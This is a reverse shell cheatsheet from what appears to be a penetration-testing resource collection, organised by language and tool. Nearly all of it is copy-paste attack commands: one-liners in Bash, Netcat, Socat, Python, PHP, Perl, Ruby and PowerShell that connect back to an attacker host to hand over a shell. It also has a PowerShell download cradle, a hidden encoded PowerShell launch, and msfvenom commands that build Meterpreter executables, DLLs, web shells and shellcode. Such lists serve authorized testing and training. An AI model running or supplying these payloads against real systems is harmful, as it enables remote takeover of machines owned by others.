% Filename: 14-resources/cheatsheets/reverse-shells.md
% Display name: Reverse Shell Cheatsheet
% Last update: 2026-02-11
% Authors: @TristanInSec

# Reverse Shell Cheatsheet

## Overview

Copy-paste reverse shell one-liners organized by language and tool.
Replace `LHOST` and `LPORT` with your listener IP and port. Always
start a listener first before triggering the shell.

## Listener Setup

```bash
# Netcat (nc)
# https://nmap.org/ncat/
nc -lvnp 4444

# Ncat with TLS encryption
ncat --ssl -lvnp 4444

# Socat (fully interactive TTY)
# http://www.dest-unreach.org/socat/
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Metasploit multi/handler
# https://www.metasploit.com/
msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST LHOST; set LPORT 4444; run"
```

## Bash

```bash
# Bash — /dev/tcp reverse shell
# https://www.gnu.org/software/bash/
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Bash — alternative using exec
exec 5<>/dev/tcp/LHOST/LPORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# Bash — via mkfifo (works on systems without /dev/tcp)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f
```

## Netcat

```bash
# Netcat — traditional (nc with -e flag)
# https://nmap.org/ncat/
nc -e /bin/sh LHOST LPORT

# Netcat — without -e (using mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f

# Ncat — with TLS encryption
ncat --ssl -e /bin/sh LHOST LPORT
```

## Socat

```bash
# Socat — basic reverse shell
# http://www.dest-unreach.org/socat/
socat tcp-connect:LHOST:LPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane

# Socat — fully interactive TTY (listener: socat file:`tty`,raw,echo=0 tcp-listen:LPORT)
socat tcp-connect:LHOST:LPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane

# Socat — TLS encrypted
socat openssl-connect:LHOST:LPORT,verify=0 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Python

```python
# Python 3
# https://docs.python.org/3/library/socket.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3 — shorter
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

## PHP

```php
# PHP — exec reverse shell
# https://www.php.net/
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP — proc_open (more reliable)
php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

## Perl

```perl
# Perl
# https://www.perl.org/
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Perl — alternative (no /bin/sh)
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```ruby
# Ruby
# https://www.ruby-lang.org/
ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby — alternative
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");loop{c.gets.chomp!;(exit! if $_=="exit");IO.popen($_,"r"){|io|c.print io.read}}'
```

## PowerShell

```powershell
# PowerShell — TCPClient reverse shell
# https://learn.microsoft.com/en-us/powershell/
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# PowerShell — one-liner (base64 encode the above for delivery)
powershell -nop -w hidden -e <base64-encoded-command>

# PowerShell — via Invoke-Expression (download cradle)
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')"
```

## msfvenom Payloads

```bash
# msfvenom — generate reverse shell payloads
# https://www.metasploit.com/

# Linux — staged Meterpreter (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf

# Linux — stageless shell (x64)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf

# Windows — staged Meterpreter (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe

# Windows — stageless shell (x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe

# Web payloads
msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o shell.jsp
msfvenom -p cmd/unix/reverse_bash LHOST=LHOST LPORT=LPORT -f raw -o shell.sh

# Windows DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o shell.dll

# Shellcode (raw bytes for custom loaders)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f c
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f python
```

## Shell Upgrades

```bash
# Upgrade a basic shell to a fully interactive TTY
# https://www.gnu.org/software/bash/

# Step 1: Spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Alternatives if python3 is not available:
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: Fix terminal settings on your machine
stty raw -echo; fg

# Step 4: Set terminal type and size in the shell
export TERM=xterm
stty rows 40 cols 120
```

## References

### Further Reading

- [Netcat / Ncat](https://nmap.org/ncat/)
- [Socat](http://www.dest-unreach.org/socat/)
- [Metasploit msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
